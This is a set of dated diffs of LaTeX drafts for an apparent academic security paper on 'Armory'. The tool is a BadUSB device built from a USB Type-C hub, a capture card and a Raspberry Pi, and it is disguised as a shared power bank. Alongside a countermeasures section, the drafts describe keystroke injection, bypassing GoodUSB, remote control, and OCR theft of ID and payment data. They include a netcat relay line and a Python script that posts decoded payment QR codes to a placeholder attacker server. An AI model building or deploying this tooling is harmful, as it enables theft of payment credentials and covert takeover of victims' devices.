+	\item\textit{USB 3.x Hub} exports the USB 3.x connector into various ports, like DisplayPort, USB 2.0 port etc.
+	\item\textit{Video Capture Card} convert DisplayPort signal into UVC-compatible\hongyi{citation needed} data, which is later processed by Raspberry Pi.
+	\item\textit{Raspberry Pi} processes video stream from the victim where private data is extracted and transmitted through GSM/WiFi.
+	\item\textit{Rubber Ducky} emulates HID device which can be controlled from either the embedded Raspberry Pi or the attacker.
+\end{itemize}
+\begin{figure}[hbtp]
+	\includegraphics[width=\linewidth]{./Figs/hardware_specification.png}
+	\caption{Hardware Specification}
+	\label{fig:hardware_specification}
+\end{figure}
+\subsubsection{Scripting Mode}
+\tool under this mode works almost the same like the original Rubber Ducky with various improvement.
 
-\subsubsection{Scripting Mode}
+First \tool supports defense mechanism bypass.
+As the original Rubber Ducky cannot get feedback from the victim, defense mechanism like USBCheckIn \cite{usbcheckin} is sufficient to prevent these BadUSB attack.
+But such defense mechanism relies on visual notification to request authentication for unknown USB device.
+This means that when the defense request authentication from the user, our \tool is able to capture the content of authentication challenge and complete it automatically or manually.
+After the defense is bypassed, \tool continues the emulation and script execution, resulting a successful attack.
+
+As the mouse relies on the visual feedback to work properly, its emulation were not supported by the original version of Rubber Ducky.
+Yet with the video output support from USB 3.x, our \tool implements full-functional mouse emulation.
+This function enables attacks toward pure GUI programs and showed great potential in mobile attack scenario.
+Details can be obtained in Section~\ref{sec:experiment}.
 \subsubsection{Remote Control Mode}

### 2021-01-04 WOOT/Files/related_work.tex
related work v_1

@@
 \label{sec:related_work}
-\hongyi{Move the stuff about USB protocol to Background}\\
-\outline{Attack based on USB 1.0, briefly}\\
-\outline{Attack based on USB 2.0, focus on works about application and transport layer}\\
-\outline{Attack survey table}\\
-\outline{Attack or current works about USB Type-C}\\
 
 In this part, we survey related works on USB attack security in Section III-A, and USB defence security in Section III-B, respectively.
+
 \subsection{USB Attack Security}
-\hongyi{DO NOT COPY!}\textcolor{red}{USB 1.0\cite{usb10} was first introduced in 1996, which was designed to provide interfaces for disparate peripherals and reduce the complexity of both hardware design and software configuration\cite{sok}.} USB 1.0 provided the data transfer for Low Speed(1.5 Mbit/s) and Full Speed( 12Mbit/s).
-Before USB 2.0 was released in 2000 and widely used, USB attacks are limited to human layer error attacks, \cite{se}, \cite{goverment}, \cite{atkvec}, \cite{ueerreallydo}, e.g, throwing a bad USB device on purpose, are in order to damage host through plugging in a peripheral by trust default.
+While many USB based  attacks have been developed, these attacks are all tied to the environment of the target devices.
+In addition, limited to the USB 2.0\cite{usb20} specification, there is no video transformation interface, the control of attack processing is impossibly handled by the attackers without additional processing signal received.
+When the  protocol masquerading attack devices, e.g., Rubbery Ducky\cite{rubber}, \cite{rubberducky2020} and USBderivery\cite{usbdriver}, are connected to the host, they will hide their own functionality with the re-write functionality interface, that works because of the HID enumeration property for USB identifying.
+Software running on the host will exfiltrate data or receive commands via the RF interface in \cite{turnip} after modified the USB table with an additional RF transmitter.
+Due to the limitations of USB 2.0, it is impossible to handle the real-time screen information of the host, so only environment fitted commands or data will work in these scenarios.
 
-USB 2.0 protocol increased the speed of data transfer and it was also expended to include digit cameras.
-According to the protocol, the host recognises the peripherals through enumeration, and this gives attacked chance to cheat the host.
-BadUSB\cite{badusb} is going to attack host by modifying the devices' identify, re-flash the firmware to add more functionalities to the USB devices, for example, it can present malicious interfaces as a sample HID interfaces or work as a network adapter on a USB thumb driver.
-Other USB attacks, \cite{rubber}, \cite{usbdriver}, \cite{usbbypassing}, \cite{iseeyou} are also masquerading the USB protocol and provided illegal functionality interface to the host, taking advantage of the permissive trust model in USB whereby the host fully trust the devices connected.
-\cite{syzkaller} use the fact that the host's USB software stack generally expects devices with a standard USB protocol, with the help of fuzzing techniques using FaceDancer \cite{facedancer} and debuggers, it takes a number of vulnerabilities to the kernel-model.
-Furthermore, expect from the protocol related attack, the radio frequency based sensitive data stealing is another kind of attack, \cite{smartphone} , \cite{poweremi}, \cite{badusbhub}, \cite{usbfinger}, \cite{side}, \cite{usbdriver} work based on signal eavesdropping to attack during the data extraction, and \cite{usbkiller}, \cite{cable}, \cite{usbee}, \cite{turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
+In a similar way, \cite{duqu} used a user-mode rootkit to hide malicious files on the USB storage device, zero-day exploits is also developed in \cite{zero-day} to automatically execute malware when the storage devices are connected to the host.
+Due to the limitation of functionality interface of devices for video transformation, the accuracy timing for wake up the devices is difficult to handle, e.g., executing the malicious code in host's free time, pause the execution processing in the inappropriate time.
 
-As our best knowledge, attacks based on USB 3.0\cite{usb30} have not been discovered.
-In this work, we focus on attack based on USB 3.0 in the layer of transport\cite{sok}, which use the USB protocol to control the host or inject malicious command to the host connected with Type-C\cite{typec}, and streal the data trough it.
+Another kind of attacks for USB to exfiltrate data\cite{smartphone}\cite{poweremi} and \cite{usbdriver} is to eavesdrop signal to recovered the sensitive data at the physical layer.
+Even though the data, including the video data, could be recovered in this way, the attack for executing malicious code is difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.
 

### 2021-01-06 WOOT/Files/related_work.tex
related work v_2

@@
 \label{sec:related_work}
+\hongyi{Move the stuff about USB protocol to Background}\\
+\outline{Attack based on USB 1.0, briefly}\\
+\outline{Attack based on USB 2.0, focus on works about application and transport layer}\\
+\outline{Attack survey table}\\
+\outline{Attack or current works about USB Type-C}\\
 
@@
 Even though the data, including the video data, could be recovered in this way, the attack for executing malicious code is difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.
+
+Since USB 3.1 was introduced with USB Type-C in 2013, display port and HDMI connectors have been provided by USB Type-C, transformation for video streaming data is guaranteed with the other attacks, e.g., protocol masquerading,  protocol corruption and code injection.
+To our best knowledge, we are the first to combine the host interaction with attack based on USB.
+Based on USB Type-C, we design Armory, a multi-mode BadUSB device\chaozu{add armory description}
+
+\chaozu{attack table}\\
+\chaozu{enum diagram}
 

### 2021-01-08 WOOT/Files/badusb.tex
complete impl part

@@
 As there were various Rubber Ducky implementation available, we only focus on its core functionality and our extension.
-Based on this pattern, we summaries our implementation of \tool into the following parts:
-
+Based on this pattern, we summaries our implementation of \tool into the following parts and their comparison can be found in Table~\ref{table:mode_comparison}:
+\begin{table*}
+	\centering
+	\begin{tabular}{|c|c|c|c|c|}
+	\hline
+	Mode & Detectibility & Automation & Power Consumption  \\
+	\hline
+	Scripting & Medium & Yes & Low\\
+	\hline
+	Remote Control & High & No & High \\
+	\hline
+	Privacy Extraction & Low & Yes & Medium\\
+	\hline
+	\end{tabular}
+	\linebreak
+	\caption{Comparison of Different Mode}
+	\label{table:mode_comparison}
+\end{table*}
 \begin{itemize}
@@
 \end{itemize}
+
 \subsubsection{Hardware Specification}
@@
 
-As the mouse relies on the visual feedback to work properly, its emulation were not supported by the original version of Rubber Ducky.
+As the mouse relies on the visual feedback to work properly, its emulation and automation were not supported by the original version of Rubber Ducky.
 Yet with the video output support from USB 3.x, our \tool implements full-functional mouse emulation.
@@
 \subsubsection{Remote Control Mode}
+In \tool, we implement all components required to operate a computer/mobile remotely, including a video stream, keyboard/mouse emulation.
+
+\tool under this mode follows a simple logic.
+\tool will receive video stream from the victim's device and redirect it to the attacker via GSM/WiFi.
+In the meanwhile, \tool also receives commands from the attacker through GSM/WiFi and replay them to the victim by USB emulation.
+
+This mode enable attacker to perform delicate operation that is beyond automation.
+Moreover, this mode provides a backdoor that does not require host network and thus is undetectable by firewall running on the host machine.
+\hongyi{I think this is a quite good selling point?}
 \subsubsection{Privacy Extraction Mode}
+\tool under this mode does not emulate other USB device and solely rely on the video stream function of USB 3.x.
+
+When running in this mode, \tool passively process the victim's video stream and detect for ``valuable'' private data.
+Here, a data is ``valuable'' or not is decided by a customized detector, we implement a simple one of payment code for demonstration purpose.
+Though this detector is simple to implement, we successfully transfer money from the victim.
+More detail can be obtained in Section~\ref{sec:experiment}.
+
+It is worth mentioning that \tool under this mode is completely passive, making it hard to be detected and defended.
+With different detector implemented, \tool under this mode is capable of serving more purpose.

### 2021-01-08 WOOT/Files/related_work.tex

@@
 
-Tian, Jing, et al.[1] have made a brief overview of the defense countermeasures over four layers attack in the article.
-For attacks against human-layer problems, [2],[3]raise people's awareness of social engineering,[][][4],[5],[6] prevent the data from being stolen by on-device encryption, [7],[8] provide host authentication, [8]monitor data flow to record potential malicious IO behaviors and [9],[10]block physical connections to defense.
-In application layer,modification over OS and driver are adapted.
-[11],[12],[13] harden  host system to prevent automatic execution of malicious code.
-GOOD USB[14] offers strict access control, with the system soliciting desired functionality from the user and blocking other functionality for a device.
-Ghost[15] simulates as a USB device to detect if the host has malicious code injection.
-In transport layer,
+There are already some defense measures against USB attacks.
+Since USB devices may hide their real functionality from the user.
+GoodUSB\cite{tian2015defending} will report the functionality and identity information of the device to the user before the enumeration is completed.
+The user needs to explicitly specify the useful functionality of the device.
+On this basis, GoodUSB loads the corresponding driver for the device, and device can not request other drivers during enumeration or usage.
+This restricts the device from loading only the drivers allowed by the user, but does not prevent the device from using available drivers to attack.
+For example, a malicious keyboard can type commands without the user's knowledge after enumeration.
+What's more, in GoodUSB, VM is deployed in host to interact with the USB device to detect malicious behavior like automatic execution of malicious code.
 
-FirmUSB[16] and VIPER[17] check the firmware of the device to ensure its safety.
-Fuzzing is a method of detecting vulnerabilities by providing unexpected input to the target system and monitoring for abnormal results.
-Some related work,[][][18],[19],[20] ,focuses on using USB fuzzing approach to detect potential bugs in USB driver.
-USBFirewall[21] protects the host based on error detection of USB communication packages.
-In some related work, [14],[22], e.
-g, VM is deployed in host to interact with the USB device for malicious behavior detection.
-In physical layer, some related work like [23] consider anti-fingerprinting ,and some others like [24] consider data encryption on USB bus.
+IMonitor EAM\cite{IMonitor} maintain a whitelist of USB devices, only if one USB device is in the whitelist can it interact with host.
+This prevents all interactions between untrusted devices and the host.
+But this reduces the ease of use and requires users to have a certain safety awareness.
+For example, a naive user may add the USB device he found outdoors to his whitelist without precautions.
+
+Google\cite{Googleukip} has developed a security tool for Linux systems that can prevent USB key injection attacks from malicious U disk devices by identifying suspicious keystroke speeds.
+This defense mechanism can be successful because the attacker cannot obtain the screen of the host based on the BadUSB under USB2.0, and can only inject instructions in a very short time to prevent the user from discovering.
+This leads to a very short interval between key events.
+
+Some composite anti-virus systems, like Metascan\cite{OPSWAT} can sanitize the malicious files in the device to containment of any malware.
+However, Metascan warned users to be wary of the device plugged into the computer, since there is currently no way to ensure absolutely security.

### 2021-01-08 WOOT/Files/related_work.tex
delete one problematic citation , probably due to the url

@@
 
-IMonitor EAM\cite{IMonitor} maintain a whitelist of USB devices, only if one USB device is in the whitelist can it interact with host.
+IMonitor EAM\cite{IMonitor}\hongyi{Citation has compilation problem, plz recheck} maintain a whitelist of USB devices, only if one USB device is in the whitelist can it interact with host.
 This prevents all interactions between untrusted devices and the host.

### 2021-01-08 WOOT/Files/experiment.tex
experiment

--- 2020-12-22 WOOT/Files/experiment.tex
@@
 \label{sec:experiment}
-\noindent\outline{Case Study: Sharing Power Bank}\\
-\outline{Overview}\\
-\outline{Attack Procedure(how to  get picture, etc.)}\\
-\outline{Security Issues against APPLE/Android...etc.}\\
-Overview, the experiment equipment consists of
-a USB Type-C hub with HDMI and USB port,
-a raspberry pi 4B with a Wi-Fi chip onboard,
+
+For the purpose evaluating effectiveness of Armory, we conduct experiments in three modes on devices with USB Type-C interface.
+
+Overview, Armory in experiments consist of a USB Type-C hub with HDMI and USB port,
+a Raspberry Pi 4B with a Wi-Fi chip onboard,
 a video capture card adapting HDMI signal to USB camera,
 and a normal powerbank with dual outputs.
+The powerbank is used to supply a piece of Raspberry Pi 4B and charge victim's device.
+The USB Type-C hub adapts USB Type-C to a HDMI port and USB ports.
 
-The normal powerbank is used to supply a piece of raspberry pi 4B and
-charge victim's device.
-The USB-C hub adapts USB Type-C to HDMI port and USB port.
- The whole equipment exposed only one type-c cable (from USB-C hub),
-and the equipment will charge his or her device through this cable,
-which has no difference from ordinary powerbanks.
+\outline{Attack Modes}
 
-\subsection{Real-time monitoring}
+\subsection{Scripting mode}
 
-When connected to network,
-the raspberry pi can use ``ffmpeg'' to encode video stream from victim device,
-and then use ``netcat'' to send encoded video stream to a intermediate transit server.
-By this means, the attacker is able to monitor the victim devices in real-time.
+In the scripting mode experiment, ``Lenovo Xiaoxin Pro 13 2020'', a PC in Windows 10 with two USB Type-C interfaces, is chosen as the target device.
+First, we connect Armory to the target device.
+Then Armory disguises itself as a normal keyboard.
+Like Rubber Ducky, Armory injects keystrokes at high speeds to perform using the hotkey to pull up a terminal (cmd.exe) and executing the malicious script in the terminal.
 
-\begin{lstlisting}[caption={Precondition Checking for the Selfdestruct Call},label=lst1:mxm]
-    nc -nlkvp 1234 | nc -nlkvp 4321
+Through executing scripts, scripting mode can implant viruses, worms, backdoors, etc., which poses a significant risk to the victim's devices. 
+However, it can only be used on devices whose terminal is available, which limits its capability to PC.
 
-\end{lstlisting}
+\subsection{Remote control mode}
 
-\subsection{Private information extraction}
+In the remote control mode experiment, ``iPad Pro (3rd generation)'', a tablet in iOS 14.3 with a USB Type-C interface, is chosen as the target device. First, we connect Armory to the target device. 
+Except performing as normal HID devices as Rubber Ducky, Armory can stream the real-time video output from the target device to the attacker through WiFi or GSM. 
+Armory capture video from USB Type-C Hub's HDMI output via a video capture card, stream video with ``FFmpeg'', and upload video stream to the attacker's device.    
+With a real-time video stream as an indicator, the attacker can precisely control the position of mouse movements and clicks.
+The attacker can control the iPad to open applications, peek at the victim's photos, etc.
 
-Real-time monitoring is ideal for the attacker to grab all information shown on victim devices,
- but it requires high power consumption to encode video streams and stable network connections.
-In some situations, high power consumption will increase the posibilities of alerting the victim,
-and it is hard to guarantee stable network connections.
+Remote control mode is ideal for the attacker to control the victim's devices and grab all information shown on the victim's devices.
+However, if the attacker wants to control with video stream indicated, it requires high power consumption to encode video streams and stable network connections.
+In the real world, high power consumption will increase the posibilities of being noticed by the victim, and stable network connections is hardly guaranteed.
 
-Considering that, extracting only high-value information for attacker (or highly sensitive information for victim) is more efficient.
-The raspberry pi can use ``opencv'' to identify information from video stream.
-For example, extracting the victim's name, photo, address, and ID number when victim is viewing his or her photos including a photo of his or her ID card,
-extracting the victim's payment information or payment code when victim is showing his or her payment information.
+\yechang{Unlock status is needed or not?}
+
+\subsection{Privacy extraction mode}
+
+In the privacy extraction mode experiment, ``HUAWEI P30'', a smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, is chosen as the target device.
+First, we connect Armory to the target device.
+As remote control mode, Armory capture video from the victim's device and use ``opencv'' to identify ``valuable'' information from video stream.
+When the victim views text or photoes with text, Armory can use optical character recognition (OCR) to extract text from corresponding video frames.
+\yechang{hyperlink to OCR?}
+For example, extracting the victim's name, photo, address, and ID number when victim is viewing his or her photos of his or her ID card or passport documents,
+extracting the victim's payment information when victim is using bank apps or payment apps.
+Besides, Armory can use ``opencv'' to detect and decode QR codes or barcodes shown on the victim's device, which is expected to extract payment code information in payment apps.
 Here is an example of extracting payment code with opencv library in listing~\ref{lst2:qr},
 
+Privacy extraction mode only extracts high-value information for attacker (or highly sensitive information for victim), which is more efficient to  than remote control mode.
+
 \begin{lstlisting}[caption={python script for extracting payment code of victim},label=lst2:qr]
-    import cv2
+import cv2, qrcode,requests
 import pyzbar.pyzbar as pyzbar
-    import qrcode
-    import requests
 def decodeDisplay(video):
-        global current
     gray = cv2.cvtColor(video, cv2.COLOR_BGR2GRAY)
@@
     for barcode in barcodes:
-            barcodeData = barcode.data.decode("utf-8")
-            barcodeType = barcode.type
-            img = qrcode.make(barcodeData)
-            requests.post(
-                'http://attacker',
-                data={'code': barcodeData}
+        barData = barcode.data.decode()
+        barType = barcode.type
+        requests.post('<server of attacker>',
+            data={
+                'data': barData, 
+                'type': barType
+            }
         )
 if __name__ == '__main__':
-        # 0 is the camera ID
     cam = cv2.VideoCapture(0)
@@
 \end{lstlisting}
+
+\subsection{Attack scenario}
+
+It is worth noting that Armory exposed only a type-c cable (from USB Type-C hub),
+and Armory will charge his or her device through this cable, which has no difference from ordinary powerbanks.
+Noticed the similarity between Armory and normal power bank, we conduct a case study on power bank sharing in order to find out the possibility of Armory being mixed into the circulation of shared power banks.
+
+\subsubsection{Case study of Power Bank Sharing}
+
+Power bank sharing provides users with short term rental of power banks.
+A provider deploys power bank stations in the city.
+Then, users can rent a power bank from any of the power bank station, charge their device on the trip, return the rented power bank to another station, and pay rent online.
+
+As an example, Brick is such a power bank sharing service provider from Sweden.
+As Brick's website states, ``Brick prevents your electronics from running out of battery with powerbanks (Bricks) that you can easily rent \& return at our many stations in Stockholm, Gothenburg, Malmö and the rest of Sweden and even Europe.''.
+\yechang{citation needed}
+
+\yechang{add hyperlink or reference to Brick's website or Brick App on App Store/Google Play.}
+
+\yechang{Add more examples of power bank sharing to show that it is widely used?}
+
+Whiling providing convenience for users, it brings security issues.
+We notice that the power bank station does not check the integrity of power banks during the rental process, and users are hardly cautious when connecting their devices to the power bank.
+A malicious user is able to modify his/her rented power bank, return it to a power bank station as normal, and its next user will unknowingly connect to this malicious power bank, which endangers the privacy of user.

### 2021-01-09 WOOT/Files/badusb.tex
Add introduction

@@
 However, these attacks suffer from various drawbacks:
-\ding{182} attackers can only simulate limited types of HIDs like keyboards, mice, and disks\hongyi{disk is not HID}, which makes the attacks less effective;
+\ding{182} attackers can only simulate limited types of devices such as HIDs (like keyboards and mice) and disks, which makes the attacks less effective;
 \ding{183} accurate attacks couldn't be performed due to lack of user interface (UI).
@@
 	\item\textit{Scripting mode} functions like the original Rubber Ducky featuring the bypass of defense mechanism like USBCheckIn\cite{usbcheckin}
+	\shuqing{Cannot bypass USBCheckIn.}
 	\item \textit{Remote control mode} allows attacker to take complete control of victim's device manually to perform delicate operation.

### 2021-01-09 WOOT/Files/introduction.tex
revise outline
Add introduction

@@
 \label{sec:introduction}
-\noindent\outline{Detail intro of USB protocol}\\
-\outline{Rubber Ducky and its function}\\
-\outline{Bank Robber and its function}\\
-\outline{Case Study of QR Scanning}\\
+
+The Universal Serial Bus (USB) protocol has become popular around the world since its appearance, as it provides a unified and easy-to-use approach for a large range of devices to communicate with each other.
+From version 1.0 till now, USB specification has evolved rapidly and offered more and more functionalities.
+Nowadays, devices with USB support are ubiquitous.
+
+On the other side of the coin, the security of USB has caused serious problems.
+The designers of USB protocol didn't care much about security issues as they wanted to make a trusted protocol.
+There are more than four hundred vulnerabilities referencing USB on CVE list~\cite{website:CVE-list}.
+As a result, lots of attackers make use of these vulnerabilities and the \textit{trust-by-default} characteristics of USB to conduct attacks, which puts the privacy and financial security of USB users in danger~\cite{sok}.
+
+BadUSB is a well-known class of firmware attacks~\cite{badusb}.
+These attacks are conducted through modification of the device firmware, which will disguise normal USB devices as other types of devices that are \textit{trust-by-default} by the hosts.
+Typical simulated devices include human interface devices (short for HID, including keyboards, mice, etc.) and disks.
+Utilizing BadUSB, attackers can pretend themselves as normal users, such as typing malicious code to victim computers, downloading and executing malicious scripts, and copying out private data from disks.
+Such attacks can easily escape from traditional anti-virus software, since it is very hard to distinguish them with normal usage.
+
+Despite the advantageous features of BadUSB, there exist several limitations as follows.
+(1) Attackers can't conduct attacks precisely, which decreases the capabilities of BadUSB attacks.
+While performing attacks on another host, the attackers can neither know the current user interface (UI) status nor obtain the consequences of their attacking actions to take subsequent moves.
+For example, it is hard for attackers to locate specific functional UI patterns like buttons and links on victim computers by disguising USB devices as mice.
+That explains why typical BadUSB attacks often only stay in command line, using commands to download malicious scripts for execution.
+However, these attacks may be intercepted by anti-virus software or firewall due to the usage of network.
+(2) To our best knowledge, existing BadUSB attacks only utilize the features of USB 2.0.
+The releasing of USB 3.0 makes USB more powerful, with a higher transmission rate for data and the support towards a larger range of devices including DisplayPort, HDMI, PowerDelivery, etc.
+BadUSB attacks can become more effective with the help of USB 3.0.
+(3) There have emerged multiple efficacious countermeasures after the appearance of BadUSB.
+For example, GoodUSB offers a defence method by limiting the functions of USB devices to users' expectations~\cite{tian2015defending}.
+It provides a graphical interface for user to describe the functionalities or roles of the USB device and reject any usage beyond the description.
+\shuqing{Can't bypass USBCheckIn.}
+
+In this work, we proposed our approach to address the limitations mentioned above and implemented a multi-mode attack model of USB, named \tool.
+\tool extends BadUSB to support the features of USB Type-C.
+Since USB Type-C is capable to transfer video steaming data, \tool could obtain the information of victim's graphical interface during attacks.
+Combining it with simulation of traditional HIDs like keyboards and mice, attackers can perform precise attacks.
+We did experiments to verify that \tool could also bypass most of the countermeasures for BadUSB since they often rely on interaction with the graphical interface.
+Moreover, we implemented multiple attacking modes of USB attacks based on our approach to verify its effectiveness, including scripting, remote control and privacy extraction.
+To improve the efficiency and performance of \tool, we designed a filtering algorithm to preprocess the video data before network transmission.
+After implementation, we conducted a series of experiments for each attack mode.
+\shuqing{Case study, evaluation, notable results.}
+
+We summarize our key contributions as follows:
+\begin{itemize}
+	\item To our best knowledge, this is the first work to utilize new features of USB Type-C.
+	The combination of new support with conventional BadUSB makes attacks more precise and effective.
+	\item Our approach can bypass most of the previous countermeasures of BadUSB.
+	\item \shuqing{Experiment, evaluation, notable results.}
+\end{itemize}
+
+The rest of this paper is structured as follows:
+\shuqing{Fill in after the structure is finalized.}

### 2021-01-10 WOOT/Files/badusb.tex
complete the coutermeasure

@@
 Though Rubber Ducky\cite{rubber} emulates as a HID device enabling various arbitrary execution attacks, fetching feedback from the victim is much more limited.
-Based on this restriction several defense mechanisms were proposed  like USBCheckIn\cite{usbcheckin}\hongyi{We need more example}.
+Based on this restriction several defense mechanisms were proposed  like GoodUSB\cite{tian2015defending}\hongyi{We need more example}.
 These defense mechanism implemented a CAPTCHA-like\cite{captcha} procedure, which requires user to complete certain challenges when a unknown HID device is plugged in.
@@
 	\item\textit{Hardware specification} the  hardware we uses to build \tool
-	\item\textit{Scripting mode} functions like the original Rubber Ducky featuring the bypass of defense mechanism like USBCheckIn\cite{usbcheckin}
+	\item\textit{Scripting mode} functions like the original Rubber Ducky featuring the bypass of defense mechanism like GoodUSB\cite{tian2015defending}
 	\shuqing{Cannot bypass USBCheckIn.}
@@
 First \tool supports defense mechanism bypass.
-As the original Rubber Ducky cannot get feedback from the victim, defense mechanism like USBCheckIn \cite{usbcheckin} is sufficient to prevent these BadUSB attack.
+As the original Rubber Ducky cannot get feedback from the victim, defense mechanism like GoodUSB \cite{tian2015defending} is sufficient to prevent these BadUSB attack.
 But such defense mechanism relies on visual notification to request authentication for unknown USB device.

### 2021-01-10 WOOT/Files/experiment.tex
complete the coutermeasure

@@
 Except performing as normal HID devices as Rubber Ducky, Armory can stream the real-time video output from the target device to the attacker through WiFi or GSM. 
-Armory capture video from USB Type-C Hub's HDMI output via a video capture card, stream video with ``FFmpeg'', and upload video stream to the attacker's device.    
+Armory capture video from USB Type-C Hub's HDMI output via a video capture card, stream video with ``FFmpeg'', a video processing utility and upload video stream to the attacker's device.    
 With a real-time video stream as an indicator, the attacker can precisely control the position of mouse movements and clicks.
@@
 \yechang{Unlock status is needed or not?}
+\hongyi{Needed}
 

### 2021-01-11 WOOT/Files/badusb.tex
add some impl, minor fix

@@
 As there were various Rubber Ducky implementation available, we only focus on its core functionality and our extension.
-Based on this pattern, we summaries our implementation of \tool into the following parts and their comparison can be found in Table~\ref{table:mode_comparison}:
+In this section, we first introduce the hardware components we used to build \tool, then we focus on the three different attack modes we implement  for various scenario.
+The comparison of these modes is available at Table~\ref{table:mode_comparison}
 \begin{table*}
@@
 \end{table*}
-\begin{itemize}
-	\item\textit{Hardware specification} the  hardware we uses to build \tool
-	\item\textit{Scripting mode} functions like the original Rubber Ducky featuring the bypass of defense mechanism like GoodUSB\cite{tian2015defending}
-	\shuqing{Cannot bypass USBCheckIn.}
-	\item \textit{Remote control mode} allows attacker to take complete control of victim's device manually to perform delicate operation.
-	\item \textit{Privacy extraction mode} captures and identify private data from the victim and send to the attacker.
-\end{itemize}
 
@@
 \end{figure}
-\subsubsection{Scripting Mode}
+\textbf{Scripting Mode}
 \tool under this mode works almost the same like the original Rubber Ducky with various improvement.
@@
 As the original Rubber Ducky cannot get feedback from the victim, defense mechanism like GoodUSB \cite{tian2015defending} is sufficient to prevent these BadUSB attack.
-But such defense mechanism relies on visual notification to request authentication for unknown USB device.
+But such defense mechanism needs visual notification to request authentication for unknown USB device.
 This means that when the defense request authentication from the user, our \tool is able to capture the content of authentication challenge and complete it automatically or manually.
@@
 Details can be obtained in Section~\ref{sec:experiment}.
-\subsubsection{Remote Control Mode}
+
+The advantage of this mode is that it archives defense bypass and attack feedback with low overhead.
+As mentioned above, we only require video stream at the begin(defense bypass) and the end(feedback) of the attack.
+Moreover, with mouse supported, \tool extends the original BadUSB attack surface and perform well in mobile device.
+
+\textbf{Remote Control Mode}
 In \tool, we implement all components required to operate a computer/mobile remotely, including a video stream, keyboard/mouse emulation.
@@
 \hongyi{I think this is a quite good selling point?}
-\subsubsection{Privacy Extraction Mode}
+
+The advantage of this mode is that it can completely hijack the victim device. But this complete control also comes with the price of high power consumption and risk of being detected by the user.
+
+\textbf{Privacy Extraction Mode}
 \tool under this mode does not emulate other USB device and solely rely on the video stream function of USB 3.x.
@@
 With different detector implemented, \tool under this mode is capable of serving more purpose.
+
+Though \tool under this mode is least detectable, \tool is also unable to fetch any information actively. All the video stream has to be analyzed and filtered to become usable private information.

### 2021-01-11 WOOT/Files/countermeasure.tex
add countermeasure

\section{Countermeasures}
\label{sec:countermeasures}
Authorization mechanism like GoodUSB\cite{tian2015defending} has been proposed as a countermeasure against BadUSB attack. But as mentioned in Section~\ref{sec:badusb} and Section~\ref{sec:experiment}, GoodUSB relies on internal display to request for authorization, which can be hijacked by our \tool. Hence, GoodUSB is indeed a great defense against traditional BadUSB attack but no defense at all for our \tool. Here we discuss some effective countermeasures against \tool.

\textbf{External Hardware Authorization}
One possible countermeasure is to introduce external hardware completing the authorization process. Contrary to the GoodUSB, USBCheckIn\cite{usbcheckin} adopts a dedicated hardware between the host and device. When a device is plugged in, the authorization will be complete on the dedicated hardware instead of internal display, preventing the host from being hijacked. Though USBCheckIn is a adequate defense against \tool, the external hardware brings additional cost and inconvenience, especially for mobile device.

\textbf{Detection Based on Processor Status}
Proposed by Meng, JFCGuard\cite{MENG2018252} is a detection mechanism of Juice Filming attack. This is based on the fact that video output will increase the usage of both GPU/CPU. As both Juice Filming attack and our \tool  highly relies on the video stream hijacking.  Thus, in a similar way, we can monitor the usage of processors and adapt a statistic model to tell whether the host device is under \tool attack. Comparing to the external hardware authorization plan, this does not require extra hardware and is more transparent to users. We have assessed this defense in Section~\ref{sec:experiment} and experiments proves this is a promising mechanism\hongyi{EXPERIMENT!!!!!!!!!!}.

\textbf{Distrust-by-Default}
Most security issues of USB protocol is due to its \textit{trust-by-default} policy. \tool also relies on this feature to work. Hence if we reject all \textit{unauthorized} device, \tool and other many USB attacks will fail. It is worth mentioning here that \textit{distrust-by-default} policy is not the same as GoodUSB\cite{tian2015defending}. The GoodUSB relies on the \textit{unauthorized} device to complete its own authorization, while in this strict policy, users have to use an \textit{authorized} device. Though \textit{distrust-by-default} policy effectively prevents these attack, this also causes considerable inconvenience for users. For example, when there is no other \textit{authorized} device plugged, it is impossible for user to complete the authorization in the first place. Thus this strict policy is far from optimal in most use cases.

### 2021-01-11 WOOT/Files/experiment.tex
[experiment] replace Armory with \tool

--- 2021-01-08 WOOT/Files/experiment.tex
@@
 
-For the purpose evaluating effectiveness of Armory, we conduct experiments in three modes on devices with USB Type-C interface.
+For the purpose evaluating effectiveness of \tool, we conduct experiments in three modes on devices with USB Type-C interface.
 
-Overview, Armory in experiments consist of a USB Type-C hub with HDMI and USB port,
+Overview, \tool in experiments consist of a USB Type-C hub with HDMI and USB port,
 a Raspberry Pi 4B with a Wi-Fi chip onboard,
@@
 In the scripting mode experiment, ``Lenovo Xiaoxin Pro 13 2020'', a PC in Windows 10 with two USB Type-C interfaces, is chosen as the target device.
-First, we connect Armory to the target device.
-Then Armory disguises itself as a normal keyboard.
-Like Rubber Ducky, Armory injects keystrokes at high speeds to perform using the hotkey to pull up a terminal (cmd.exe) and executing the malicious script in the terminal.
+First, we connect \tool to the target device.
+Then \tool disguises itself as a normal keyboard.
+Like Rubber Ducky, \tool injects keystrokes at high speeds to perform using the hotkey to pull up a terminal (cmd.exe) and executing the malicious script in the terminal.
 
@@
 
-In the remote control mode experiment, ``iPad Pro (3rd generation)'', a tablet in iOS 14.3 with a USB Type-C interface, is chosen as the target device. First, we connect Armory to the target device. 
-Except performing as normal HID devices as Rubber Ducky, Armory can stream the real-time video output from the target device to the attacker through WiFi or GSM. 
-Armory capture video from USB Type-C Hub's HDMI output via a video capture card, stream video with ``FFmpeg'', and upload video stream to the attacker's device.    
+In the remote control mode experiment, ``iPad Pro (3rd generation)'', a tablet in iOS 14.3 with a USB Type-C interface, is chosen as the target device. First, we connect \tool to the target device.
+Except performing as normal HID devices as Rubber Ducky, \tool can stream the real-time video output from the target device to the attacker through WiFi or GSM.
+\tool capture video from USB Type-C Hub's HDMI output via a video capture card, stream video with ``FFmpeg'', a video processing utility and upload video stream to the attacker's device.
 With a real-time video stream as an indicator, the attacker can precisely control the position of mouse movements and clicks.
@@
 In the privacy extraction mode experiment, ``HUAWEI P30'', a smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, is chosen as the target device.
-First, we connect Armory to the target device.
-As remote control mode, Armory capture video from the victim's device and use ``opencv'' to identify ``valuable'' information from video stream.
-When the victim views text or photoes with text, Armory can use optical character recognition (OCR) to extract text from corresponding video frames.
+First, we connect \tool to the target device.
+As remote control mode, \tool capture video from the victim's device and use ``opencv'' to identify ``valuable'' information from video stream.
+When the victim views text or photoes with text, \tool can use optical character recognition (OCR) to extract text from corresponding video frames.
